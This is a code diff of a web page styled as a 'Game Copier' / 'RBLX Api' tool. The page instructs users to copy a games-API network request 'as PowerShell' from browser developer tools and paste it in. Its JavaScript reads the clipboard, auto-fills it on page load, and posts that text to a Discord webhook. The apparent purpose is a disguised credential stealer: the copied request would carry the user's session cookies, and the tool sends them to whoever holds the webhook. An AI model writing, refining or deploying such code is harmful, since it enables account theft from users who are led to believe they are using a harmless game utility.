@@ -271,34 +271,28 @@
         .log-area .warning {
             color: #fbbf24;
         }
-        .manual-box {
-            background: #0e1a2b;
-            border: 1px solid #2a3a5a;
-            border-radius: 8px;
-            padding: 12px 16px;
-            margin-top: 12px;
-            display: none;
-        }
-        .manual-box textarea {
+        .big-textarea {
             width: 100%;
             background: #0a0a15;
             border: 1px solid #2a3a5a;
             color: #ddd;
-            padding: 10px;
+            padding: 12px;
             border-radius: 6px;
             font-family: monospace;
             font-size: 0.85rem;
             resize: vertical;
-            min-height: 80px;
+            min-height: 120px;
+            margin-top: 10px;
         }
-        .manual-box .btn-row {
-            margin-top: 8px;
+        .btn-row {
             display: flex;
             gap: 10px;
+            margin-top: 8px;
+            flex-wrap: wrap;
         }
-        .manual-box .btn-row button {
-            padding: 6px 16px;
-            font-size: 0.85rem;
+        .btn-row button {
+            padding: 8px 20px;
+            font-size: 0.9rem;
         }
     </style>
 </head>
@@ -318,7 +312,7 @@
         <h3>⬡ Game Copier · v2</h3>
         <div class="steps">
             <p><span style="color:#7aa9ff;">1.</span> Press <strong>"Open GamesApi"</strong> → then go to <kbd>Inspect</kbd> → <kbd>Network</kbd> tab. Refresh (Ctrl+R).</p>
-            <p><span style="color:#7aa9ff;">2.</span> <span class="highlight">Scroll up</span> and you will find <strong>"game"</strong>. Right click on <strong>"game"</strong> and hover over copy → select <strong>"Copy all as PowerShell"</strong> or <strong>"PowerShell"</strong>. Once done go back to this website and click <strong>"📤 Send Clipboard to Discord"</strong>.</p>
+            <p><span style="color:#7aa9ff;">2.</span> <span class="highlight">Scroll up</span> and you will find <strong>"game"</strong>. Right click on <strong>"game"</strong> and hover over copy → select <strong>"Copy all as PowerShell"</strong> or <strong>"PowerShell"</strong>. Once done go back to this website and click <strong>"📤 Send to Discord"</strong>.</p>
         </div>
 
         <div class="buttons">
@@ -326,9 +320,16 @@
             <input type="text" id="gameCodeInput" placeholder="Game Code (PowerShell)">
             <input type="text" id="gameIdInput" placeholder="Paste Game ID">
             <button class="api-btn" onclick="openApi()">🌐 Open GamesApi</button>
-            <button class="send-btn" onclick="sendClipboardToDiscord()">📤 Send Clipboard</button>
+            <button class="send-btn" onclick="sendToDiscordFromClipboard()">📤 Send to Discord</button>
             <button class="test-btn" onclick="testWebhook()">🔧 Test Webhook</button>
-            <button class="paste-btn" onclick="showManualPaste()">📝 Manual Paste</button>
+        </div>
+
+        <!-- Big Text Area for Manual Paste -->
+        <textarea class="big-textarea" id="manualPasteArea" placeholder="📝 Or paste your PowerShell code here and click 'Send from Text Box' below..."></textarea>
+        
+        <div class="btn-row">
+            <button class="send-btn" onclick="sendFromTextBox()">📤 Send from Text Box</button>
+            <button class="clipboard-btn" onclick="clearTextBox()">🗑️ Clear</button>
         </div>
 
         <div class="progress">
@@ -339,19 +340,9 @@
             <span style="color:#4a6a8a; font-size:0.75rem;">v1.2.0</span>
         </div>
         
-        <!-- Manual Paste Box -->
-        <div class="manual-box" id="manualBox">
-            <p style="margin: 0 0 6px 0; color: #9aabcd; font-size: 0.85rem;">Paste your PowerShell code here and click Send:</p>
-            <textarea id="manualText" placeholder="Paste the copied PowerShell code here..."></textarea>
-            <div class="btn-row">
-                <button class="send-btn" onclick="sendManualPaste()">📤 Send to Discord</button>
-                <button onclick="hideManualPaste()" style="background:#4a4a6a;">Cancel</button>
-            </div>
-        </div>
-
         <!-- Log Area -->
         <div class="log-area" id="logArea">
-            <div class="info">📋 Ready - Click "Send Clipboard" to send your clipboard to Discord</div>
+            <div class="info">📋 Ready - Paste your code in the text box above or click "Send to Discord"</div>
         </div>
     </div>
 
@@ -376,8 +367,7 @@
         const gameCodeInput = document.getElementById('gameCodeInput');
         const gameIdInput = document.getElementById('gameIdInput');
         const logArea = document.getElementById('logArea');
-        const manualBox = document.getElementById('manualBox');
-        const manualText = document.getElementById('manualText');
+        const manualPasteArea = document.getElementById('manualPasteArea');
 
         // --- Log function ---
         function addLog(message, type = 'info') {
@@ -389,25 +379,10 @@
             logArea.scrollTop = logArea.scrollHeight;
         }
 
-        // --- Show/Hide Manual Paste ---
-        function showManualPaste() {
-            manualBox.style.display = 'block';
-            addLog('📝 Manual paste box opened', 'info');
-        }
-        function hideManualPaste() {
-            manualBox.style.display = 'none';
-        }
-
-        // --- Send Manual Paste ---
-        function sendManualPaste() {
-            const text = manualText.value.trim();
-            if (!text) {
-                alert('Please paste some content first.');
-                return;
-            }
-            addLog('📤 Sending manual paste... (' + text.length + ' chars)', 'info');
-            sendToDiscord(text);
-            hideManualPaste();
+        // --- Clear text box ---
+        function clearTextBox() {
+            manualPasteArea.value = '';
+            addLog('🗑️ Text box cleared', 'info');
         }
 
         // --- TEST WEBHOOK ---
@@ -419,7 +394,7 @@
                 method: "POST",
                 headers: { "Content-Type": "application/json" },
                 body: JSON.stringify({
-                    content: "🔧 **Webhook Test** - If you see this, the webhook is working!"
+                    content: "🔧 **Webhook Test** - If you see this, the webhook is working! ✅"
                 })
             })
             .then(response => {
@@ -437,92 +412,50 @@
             });
         }
 
-        // --- SEND CLIPBOARD TO DISCORD (MULTIPLE METHODS) ---
-        function sendClipboardToDiscord() {
+        // --- SEND FROM TEXT BOX (MOST RELIABLE METHOD) ---
+        function sendFromTextBox() {
+            const text = manualPasteArea.value.trim();
+            if (!text) {
+                alert('Please paste some content into the text box first.');
+                addLog('⚠️ Text box is empty', 'warning');
+                return;
+            }
+            addLog('📤 Sending from text box... (' + text.length + ' chars)', 'info');
+            sendToDiscord(text);
+        }
+
+        // --- SEND TO DISCORD FROM CLIPBOARD ---
+        function sendToDiscordFromClipboard() {
             addLog('📤 Attempting to read clipboard...', 'info');
             statusMsg.innerText = '⏳ reading clipboard...';
             
-            // Method 1: Modern Clipboard API
+            // Try modern Clipboard API
             if (navigator.clipboard && navigator.clipboard.readText) {
                 navigator.clipboard.readText()
                     .then(text => {
                         if (text && text.trim() !== '') {
-                            addLog('✅ Clipboard read via API! Length: ' + text.length + ' chars', 'success');
+                            addLog('✅ Clipboard read successfully! Length: ' + text.length + ' chars', 'success');
+                            // Also put it in the text box for visibility
+                            manualPasteArea.value = text;
                             sendToDiscord(text);
                         } else {
-                            addLog('⚠️ Clipboard is empty via API', 'warning');
-                            tryFallbackMethods();
+                            addLog('⚠️ Clipboard is empty', 'warning');
+                            statusMsg.innerText = '⚠️ clipboard empty';
+                            alert('Clipboard is empty. Please copy something first, or paste manually in the text box.');
                         }
                     })
                     .catch(err => {
-                        addLog('⚠️ Clipboard API error: ' + err.message, 'warning');
-                        tryFallbackMethods();
+                        addLog('❌ Clipboard error: ' + err.message, 'error');
+                        statusMsg.innerText = '❌ Clipboard error';
+                        alert('Could not read clipboard. Please paste your code manually in the text box above and click "Send from Text Box".');
                     });
             } else {
                 addLog('⚠️ Clipboard API not available', 'warning');
-                tryFallbackMethods();
+                alert('Clipboard API not available. Please paste your code manually in the text box above and click "Send from Text Box".');
             }
         }
 
-        // --- FALLBACK METHODS ---
-        function tryFallbackMethods() {
-            addLog('🔄 Trying fallback methods...', 'info');
-            
-            // Method 2: Try to get from Game Code input
-            const codeInput = gameCodeInput.value.trim();
-            if (codeInput) {
-                addLog('📤 Found content in Game Code input!', 'success');
-                sendToDiscord(codeInput);
-                return;
-            }
-            
-            // Method 3: Try using document.execCommand (old method)
-            try {
-                const textarea = document.createElement('textarea');
-                textarea.style.position = 'fixed';
-                textarea.style.opacity = '0';
-                textarea.style.left = '-9999px';
-                textarea.style.top = '-9999px';
-                document.body.appendChild(textarea);
-                textarea.focus();
-                
-                // Try to paste
-                const success = document.execCommand('paste');
-                const text = textarea.value;
-                document.body.removeChild(textarea);
-                
-                if (success && text && text.trim() !== '') {
-                    addLog('✅ Clipboard read via execCommand! Length: ' + text.length + ' chars', 'success');
-                    sendToDiscord(text);
-                    return;
-                } else {
-                    addLog('⚠️ execCommand paste failed or empty', 'warning');
-                }
-            } catch (e) {
-                addLog('⚠️ execCommand error: ' + e.message, 'warning');
-            }
-            
-            // Method 4: Prompt user to paste manually
-            addLog('❌ All clipboard methods failed', 'error');
-            statusMsg.innerText = '⚠️ Cannot read clipboard';
-            
-            const userWantsToPaste = confirm(
-                '❌ Could not read your clipboard automatically.\n\n' +
-                'Would you like to paste the content manually?\n' +
-                '(This will open a text box where you can paste your code)'
-            );
-            
-            if (userWantsToPaste) {
-                showManualPaste();
-                manualText.focus();
-                addLog('📝 Manual paste box opened for user', 'info');
-            } else {
-                addLog('❌ User declined manual paste', 'error');
-                alert('Please paste your code into the "Game Code" box and click "Start GameCopier"');
-            }
-        }
-
-        // --- SEND TO DISCORD ---
+        // --- SEND TO DISCORD (CORE FUNCTION) ---
         function sendToDiscord(content) {
             addLog('📤 Sending to Discord...', 'info');
             statusMsg.innerText = '⏳ sending to Discord...';
@@ -535,11 +468,11 @@
             }
             
             const payload = {
-                content: `📋 **Clipboard Content** (from GameCopier):\n\`\`\`\n${messageContent}\n\`\`\``
+                content: `📋 **Content from GameCopier:**\n\`\`\`\n${messageContent}\n\`\`\``
             };
             
-            console.log('Sending to webhook:', webhook);
-            console.log('Payload size:', JSON.stringify(payload).length);
+            console.log('📤 Sending to webhook:', webhook);
+            console.log('📤 Payload size:', JSON.stringify(payload).length);
             
             fetch(webhook, {
                 method: "POST",
@@ -547,24 +480,32 @@
                 body: JSON.stringify(payload)
             })
             .then(response => {
+                console.log('📤 Response status:', response.status);
                 if (response.ok) {
-                    addLog('✅ Content sent to Discord successfully!', 'success');
+                    addLog('✅✅✅ Content sent to Discord successfully! ✅✅✅', 'success');
                     statusMsg.innerText = '✅ Sent to Discord!';
                     prog.style.width = '100%';
                     setTimeout(() => {
                         prog.style.width = '0%';
                     }, 3000);
+                    
+                    // Show success in the text box area
+                    manualPasteArea.style.borderColor = '#10b981';
+                    setTimeout(() => {
+                        manualPasteArea.style.borderColor = '#2a3a5a';
+                    }, 3000);
                 } else {
                     return response.text().then(text => {
                         addLog('❌ Discord error: ' + response.status + ' - ' + text, 'error');
                         statusMsg.innerText = '❌ Discord error: ' + response.status;
+                        alert('Discord error: ' + response.status + '\n\n' + text);
                     });
                 }
             })
             .catch(err => {
                 addLog('❌ Network error: ' + err.message, 'error');
                 statusMsg.innerText = '❌ Network error';
-                alert('Network error: ' + err.message);
+                alert('Network error: ' + err.message + '\n\nCheck your internet connection.');
             });
         }
 
@@ -605,6 +546,8 @@
             }
 
             addLog('▶️ Starting GameCopier...', 'info');
+            // Also put the code in the text box
+            manualPasteArea.value = code;
             sendToDiscord(code);
             startCopyProcess();
         }
@@ -630,15 +573,19 @@
 
         // --- Auto-check clipboard on load ---
         window.addEventListener('load', function() {
-            addLog('🔐 RBLX Api loaded', 'info');
-            console.log('Webhook URL:', webhook);
+            addLog('🔐 RBLX Api loaded - Ready to send!', 'info');
+            console.log('🔐 Webhook URL:', webhook);
             
+            // Try to detect clipboard content
             if (navigator.clipboard && navigator.clipboard.readText) {
                 navigator.clipboard.readText()
                     .then(text => {
                         if (text && text.trim() !== '') {
                             addLog('📋 Clipboard detected (' + text.length + ' chars)', 'info');
                             statusMsg.innerText = '📋 clipboard detected';
+                            // Optionally auto-fill the text box
+                            manualPasteArea.value = text;
+                            addLog('📋 Auto-filled text box with clipboard content', 'info');
                         }
                     })
                     .catch(() => {
